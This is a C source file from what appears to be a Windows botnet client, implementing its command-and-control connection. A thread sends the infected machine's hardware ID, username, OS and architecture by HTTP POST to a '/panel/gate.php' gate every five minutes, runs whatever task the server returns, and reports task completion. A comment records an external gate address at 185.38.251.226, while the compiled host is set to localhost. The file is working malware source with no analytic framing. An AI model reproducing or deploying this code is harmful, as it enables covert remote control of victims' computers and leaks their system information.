#include "connection.h"

#include <Wininet.h>

#include "string.h"
#include "os_info.h"

#include "tasks.h"
#include "mem.h"

HANDLE hConnectionThread;

//http://185.38.251.226:8080/panel/gate.php

#ifndef DEBUG
#define REMOTE_HOST "127.0.0.1"
#define REMOTE_PAGE "/panel/gate.php"
#else
#define REMOTE_HOST "127.0.0.1"
#define REMOTE_PAGE "/panel/gate.php"
#endif

extern bot_t bot;

BOOL SendPOST(const LPSTR pszHost, const LPSTR pszPage, const LPSTR pszData, LPSTR* ppszResponse)
{
	HINTERNET hSession, hConnect, hRequest;
	BOOL bSuccess = FALSE;
	char szBuffer[3072];
	DWORD dwDataRead;

	static LPSTR accept[2] = { "*/*", NULL };
	static TCHAR pszHeaders[] =
		("Content-Type: application/x-www-form-urlencoded");

	hRequest = 0;
	hConnect = 0;
	hSession = 0;

	do 
	{
		if ((hSession = bot.api.pInternetOpenW(L"VultureHttp", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0)) == NULL)
			break;

		if ((hConnect = bot.api.pInternetConnectA(hSession, pszHost, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1)) == NULL)
			break;

		if ((hRequest = bot.api.pHttpOpenRequestA(hConnect, "POST", pszPage, NULL, NULL, accept, 0, 1)) == NULL)
			break;

		if ((bSuccess = bot.api.pHttpSendRequestA(hRequest, pszHeaders, StrLengthA(pszHeaders), pszData, StrLengthA(pszData))) == TRUE)
		{
			memzero(&szBuffer, sizeof(szBuffer));

			if (bot.api.pInternetReadFile(hRequest, szBuffer, 3071, &dwDataRead) && dwDataRead != 0)
			{
				if ((*ppszResponse = memalloc(dwDataRead)) != NULL)
				{
					memcopy(*ppszResponse, &szBuffer, dwDataRead);
				}
			}
		}
	} 
	while (FALSE);

	if (hRequest != 0) 
		bot.api.pInternetCloseHandle(hRequest);

	if (hConnect != 0)
		bot.api.pInternetCloseHandle(hConnect);

	if (hSession != 0)
		bot.api.pInternetCloseHandle(hSession);

	return bSuccess;
}

BOOL WINAPI SendTaskSuccess(int iTaskID)
{
	LPSTR pszResponse = NULL;
	BOOL bSuccess = FALSE;
	pc_info_t pc_info = *(pc_info_t*)GetPCInfo();
	
	char szBuffer[256];
	memzero(&szBuffer, sizeof(szBuffer));
	bot.api.pwsprintfA(szBuffer, "hwid=%x&taskid=%d&", pc_info.dwSerialNumber, iTaskID);

	bSuccess = SendPOST(REMOTE_HOST, REMOTE_PAGE, szBuffer, &pszResponse);

	if (pszResponse != NULL)
		memfree(pszResponse);

	return bSuccess;
}

DWORD WINAPI Connection_Thread(LPVOID lpArguments)
{
	bot = *(bot_t*)lpArguments;

	LPSTR pszResponse = NULL;
	char szBuffer[256];

	pc_info_t pc_info = *(pc_info_t*)GetPCInfo();

	while (TRUE)
	{
		memzero(&szBuffer, sizeof(szBuffer));
		bot.api.pwsprintfA(szBuffer, "hwid=%x&username=%s&os=%d&arch=%d&", pc_info.dwSerialNumber, pc_info.pszUsername, pc_info.iOS, pc_info.Is64Bit);

		if (SendPOST(REMOTE_HOST, REMOTE_PAGE, szBuffer, &pszResponse))
		{
			if (pszResponse != NULL)
			{
				ExecuteTask(pszResponse);
			}
		}

		if (pszResponse != NULL)
		{
			memfree(pszResponse);
			pszResponse = NULL;
		}

		bot.api.pSleep(5 * 60000);
	}

	return 0;
}

BOOL StartConnectionThread(void)
{
	if ((hConnectionThread = bot.api.pCreateThread(0, 0, (LPTHREAD_START_ROUTINE)Connection_Thread, &bot, 0, 0)) != 0)
		return TRUE;
	return FALSE;
}